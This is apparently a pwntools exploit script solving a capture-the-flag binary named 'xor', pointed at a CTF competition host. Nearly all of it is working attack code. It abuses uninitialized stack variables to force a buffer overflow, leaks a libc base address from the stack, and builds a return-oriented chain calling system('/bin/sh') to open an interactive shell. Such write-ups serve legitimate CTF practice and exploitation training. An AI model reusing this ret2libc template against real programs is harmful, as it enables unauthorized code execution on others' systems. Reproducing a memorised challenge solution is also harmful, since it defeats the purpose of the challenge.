#!/usr/bin/env python3
from pwn import *

exe = ELF("./xor")

libc = exe.libc

HOST, PORT = "pwn.chal.ctf.gdgalgiers.com", 1400

context.binary = exe
context.terminal = ["tmux", "splitw", "-h", "-p", "75"]

# Constants

GDBSCRIPT = '''\
'''
CHECKING = True

# offset to size variable in name buffer
SIZE_NAME_OFF = 152
# offset to answer variable in name buffer
ANSWER_NAME_OFF = 127
# libc leak offset
LIBC_LEAK_OFF = 0x29d90
# max buffer size
MAX_BUF_SIZE = 0x50
# size for buffer overflow
BOF_SIZE = MAX_BUF_SIZE + 0x8 * 0x8 + 1
# offset to leaked libc address
LIBC_LEAK_STACK_OFF = MAX_BUF_SIZE + 0x7 * 0x8
# offset to leaked return address
RET_ADDR_STACK_OFF = MAX_BUF_SIZE + 0x3 * 0x8

def main():
    global io

    io = conn()

    # Setup uninitialized variables when entering name

    name = flat(
        {
            # 1. Set value of uninitialized variable "size"
            SIZE_NAME_OFF: BOF_SIZE,
            # 2. Set value of uninitialized variable "answer" to 'y',
            #    that way we never enter the loop and the value of "size"
            #    stays uninitialized
            ANSWER_NAME_OFF: b"y",
        }
    )
    io.recvuntil(b"Enter your name: ")
    io.send(name)

    # Leak libc address

    buf = show_buffer()
    libc_leak = buf[LIBC_LEAK_STACK_OFF:LIBC_LEAK_STACK_OFF+8]
    libc.address = leak(libc_leak, LIBC_LEAK_OFF, "libc", True)

    # ROP

    roplibc = ROP(libc)
    pop_rdi = roplibc.find_gadget(["pop rdi", "ret"]).address
    ret = roplibc.find_gadget(["ret"]).address

    payload = buf[:RET_ADDR_STACK_OFF]
    payload += flat(
        pop_rdi,
        next(libc.search(b"/bin/sh\0")),
        ret, # for stack alignment
        libc.sym.system,
    )
    set_buffer(payload)

    # Trigger return for ROP
    io.recvuntil(b"Choice: ")
    io.sendline(b"0") # 0) Exit

    io.interactive()

def set_buffer(buf):
    io.recvuntil(b"Choice: ")
    io.sendline(b"1") # 1) Set buffer
    io.recvuntil(b"Enter bytes: ")
    io.send(buf)

def show_buffer():
    io.recvuntil(b"Choice: ")
    io.sendline(b"4") # 4) Show buffer
    io.recvuntil(b"Buffer: ")
    buf = io.recvuntil(b"\nCurrent XOR key: ", drop=True)
    return buf

def leak(buf, offset, leaktype, verbose=False):
    verbose and log.info(f"buf: {buf}")
    leak_addr = unpack(buf.ljust(context.bytes, b"\x00"))
    base_addr = leak_addr - offset
    verbose and log.info(f"{leaktype} leak: {leak_addr:#x}")
    log.success(f"{leaktype} base address: {base_addr:#x}")
    return base_addr

def stop():
    io.interactive()
    io.close()
    exit(1)

def check(predicate, disabled=False):
    if not disabled and CHECKING:
        assert(predicate)

def conn():
    if args.REMOTE:
        p = remote(HOST, PORT)
    elif args.GDB:
        p = gdb.debug(exe.path, gdbscript=GDBSCRIPT)
    else:
        p = process(exe.path)

    return p

if __name__ == "__main__":
    io = None
    try:
        main()
    finally:
        if io:
            io.close()
